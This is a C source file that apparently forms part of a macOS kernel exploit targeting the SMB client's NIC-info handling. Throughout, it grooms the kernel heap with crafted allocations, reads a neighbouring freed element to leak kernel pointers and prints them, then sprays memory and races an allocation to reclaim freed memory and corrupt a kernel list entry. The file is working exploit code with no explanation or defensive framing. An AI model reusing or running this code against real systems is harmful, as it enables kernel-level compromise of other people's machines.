//
//  zfree_kext.c
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>

#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include "../smb/nic_allocator.h"
#include "../smb/client.h"

#include "zfree_kext.h"
#include "allocator_rw.h"
#include "allocator_nic_parallel.h"
#include "neighbor_reader.h"
#include "platform_constants.h"
#include "util_binary.h"
#include "util_misc.h"
#include "util_dispatch.h"


int kmem_zfree_kext_leak_nic(smb_nic_allocator allocator, kmem_neighour_reader_t neighbor_reader, const struct sockaddr_in* addr, struct complete_nic_info_entry* out) {
    
    smb_nic_allocator gap_allocator = smb_nic_allocator_create(addr, sizeof(*addr));
    
    int num_gaps = XE_PAGE_SIZE / 96 * 4;
    int num_elements_before_gap = 7;
    
    for (int gap_idx = 0; gap_idx < num_gaps; gap_idx++) {
        struct network_nic_info elements[num_elements_before_gap];
        bzero(elements, sizeof(elements));
        
        for (int element_idx = 0; element_idx < num_elements_before_gap; element_idx++) {
            struct network_nic_info* info = &elements[element_idx];
            info->nic_index = gap_idx * num_elements_before_gap + element_idx;
            info->addr_4.sin_len = sizeof(struct sockaddr_in);
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_addr.s_addr = info->nic_index;
            info->addr_4.sin_port = htons(1234);
            info->nic_link_speed = ((num_gaps * num_elements_before_gap) - info->nic_index);
            info->next_offset = sizeof(*info);
        }
        
        int error = smb_nic_allocator_allocate(allocator, elements, num_elements_before_gap, (uint32_t)sizeof(elements));
        assert(error == 0);
        
        struct network_nic_info gap;
        bzero(&gap, sizeof(gap));
        gap.nic_index = gap_idx;
        gap.addr_4.sin_family = AF_INET;
        gap.addr_4.sin_len = sizeof(struct sockaddr_in);
        gap.addr_4.sin_port = htons(4321);
        gap.addr_4.sin_addr.s_addr = gap_idx;
        
        error = smb_nic_allocator_allocate(gap_allocator, &gap, 1, sizeof(gap));
        assert(error == 0);
    }
    
    int error = smb_nic_allocator_destroy(&gap_allocator);
    assert(error == 0);
    
    char data[96];
    error = kmem_neighbor_reader_prepare_read_modified(neighbor_reader, data, sizeof(data));
    if (error) {
        return error;
    }
        
    struct complete_nic_info_entry* entry = (struct complete_nic_info_entry*)data;
    if (entry->nic_index > num_gaps * num_elements_before_gap || entry->next.prev == 0) {
        return EIO;
    }
    
    memcpy(out, data, sizeof(*out));
    return 0;
}


void kmem_zfree_kext_allocate_sockets(smb_nic_allocator allocator, int nic_index, size_t count, uint8_t sin_len) {
    size_t done = 0;
    size_t max_batch_size = 1024;
    while (done < count) {
        size_t batch_size = XE_MIN(max_batch_size, count - done);
        struct network_nic_info infos[batch_size];
        bzero(infos, sizeof(infos));
        for (int sock_idx = 0; sock_idx < batch_size; sock_idx++) {
            struct network_nic_info* info = &infos[sock_idx];
            info->nic_index = nic_index;
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_len = sin_len;
            info->addr_4.sin_port = htons(1234);
            info->addr_4.sin_addr.s_addr = (uint32_t)done + sock_idx;
            info->next_offset = sizeof(*info);
            info->nic_link_speed = UINT32_MAX;
        }
        int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)sizeof(infos));
        assert(error == 0);
        done += batch_size;
    }
}


void kmem_zfree_kext_reserve_nics(smb_nic_allocator allocator, size_t count) {
    size_t done = 0;
    size_t max_batch_size = 1024;
    while (done < count) {
        size_t batch_size = XE_MIN(max_batch_size, count - done);
        struct network_nic_info infos[batch_size];
        bzero(infos, sizeof(infos));
        for (int i = 0; i < batch_size; i++) {
            struct network_nic_info* info = &infos[i];
            info->nic_index = (uint32_t)done + i;
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_len = sizeof(info->addr_4);
            info->next_offset = sizeof(*info);
        }
        int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)sizeof(infos));
        assert(error == 0);
        done += batch_size;
    }
}


void kmem_zfree_reserve_va(struct sockaddr_in* smb_addr) {
    int num_reserved_pages = 70;
    int num_768_allocs = XE_PAGE_SIZE * num_reserved_pages / (768 * 2);
    int num_32_allocs = XE_PAGE_SIZE * num_reserved_pages / (32 * 2);
    
    kmem_allocator_rw_t rw_allocator = kmem_allocator_rw_create(smb_addr, num_768_allocs);
    kmem_allocator_nic_parallel_t nic_allocator = kmem_allocator_nic_parallel_create(smb_addr, num_32_allocs);
    
    char* data = alloca(768);
    kmem_allocator_nic_parallel_alloc(nic_allocator, data, 32-8);
    
    int error = kmem_allocator_rw_allocate(rw_allocator, num_768_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
        *data1 = data;
        *data1_size = 768;
        *data2 = data;
        *data2_size = 768;
    }, NULL);
    assert(error == 0);
    kmem_allocator_nic_parallel_destroy(&nic_allocator);
    error = kmem_allocator_rw_destroy(&rw_allocator);
    assert(error == 0);
}


int kmem_zfree_kext(struct sockaddr_in* smb_addr, uintptr_t tailq) {
    kmem_neighour_reader_t neighbor_reader = kmem_neighbor_reader_create();
    kmem_zfree_reserve_va(smb_addr);
    
    smb_nic_allocator nic_allocator;
    kmem_allocator_rw_t temp_allocator = kmem_allocator_rw_create(smb_addr, XE_PAGE_SIZE * 70 / (768 * 2));
    
    struct complete_nic_info_entry entry;
    int tries = 10;
    do {
        nic_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
        int error = kmem_zfree_kext_leak_nic(nic_allocator, neighbor_reader, smb_addr, &entry);
        if (error) {
            smb_nic_allocator_destroy(&nic_allocator);
            kmem_neighbor_reader_reset(neighbor_reader);
        } else {
            break;
        }
    } while (tries--);
    
    assert(tries >= 0);
    assert(entry.next.prev != 0);
    
    printf("%p\n", entry.addr_list.next);
    
    entry.addr_list.next = NULL;
    entry.addr_list.prev = NULL;
    
    char* data = alloca(768);
    memset(data, 0xff, 768);
    int error = kmem_allocator_rw_allocate(temp_allocator, XE_PAGE_SIZE * 70 / (768 * 2), ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
        *data1 = data;
        *data1_size = 768;
        *data2 = data;
        *data2_size = 768;
    }, NULL);
    assert(error == 0);
    
    printf("%p\n", entry.next.next);
    
    for (int i = 0; i < 100; i++) {
        printf("%d / 100\n", i);
        kmem_zfree_kext_allocate_sockets(nic_allocator, INT32_MAX - i, 10000, sizeof(struct sockaddr_in));
    }

    kmem_zfree_kext_allocate_sockets(nic_allocator, (uint32_t)entry.nic_index, 512, 96);
    
    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(smb_addr, 1024 * 500);

    dispatch_async(xe_dispatch_queue(), ^() {
        struct network_nic_info info;
        bzero(&info, sizeof(info));
        info.nic_index = (uint32_t)entry.nic_index;
        int error = smb_nic_allocator_allocate(nic_allocator, &info, 1, sizeof(info));
        assert(error == 0);
    });
    
    kmem_allocator_nic_parallel_alloc(capture_allocator, ((char*)&entry) + 8, 88);
    
    return 0;
}
